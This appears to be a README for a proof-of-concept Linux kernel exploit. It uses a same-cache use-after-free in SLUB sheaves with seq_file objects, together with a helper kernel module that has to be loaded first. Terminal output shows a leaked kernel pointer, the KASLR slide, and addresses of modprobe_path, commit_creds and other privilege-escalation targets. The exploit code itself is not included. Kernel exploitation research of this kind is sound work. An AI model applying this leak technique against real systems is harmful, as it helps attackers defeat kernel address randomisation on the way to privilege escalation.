# Same Cache UAF Exploitation pOc for Linux 7.0 Slub Sheaves (UAF read information leak)

>Same cache UAF read information leak pOc using seq_file. No LPE, just info leak.

Compile the LKM and then insmod before run the exploit.

<pre>
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_read_leak_seq_file/exploit$ ./exploit
[*] obj_size=120 (sizeof seq_file)
[*] victim freed (dangling). cross-cache reclaim via seq_file...
[*] pre-groom 400 seq_file (/proc/cpuinfo, op=.text)
[+] .text ptr @+0x058 = 0xffffffffb400a220
[+] .text leak = 0xffffffffb400a220
[+] KASLR slide = 0x0000000031800000
[+] kernel .text base = 0xffffffffb2800000
========================================
          complete information          
========================================
[+] init_task = 0xffffffffb50134c0
[+] modprobe_path = 0xffffffffb521f6e0
[+] commit_creds = 0xffffffffb2c75280
[+] init_cred = 0xffffffffb5015b80
========================================

Verify ?
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_read_leak_seq_file/exploit$ sudo cat /proc/kallsyms | grep modprobe_path
ffffffffb521f6e0 T modprobe_path

How to know that the slide is valid ?
it has to be 2 MB aligned, math : 

slide mod 0x200000 = 0
</pre>


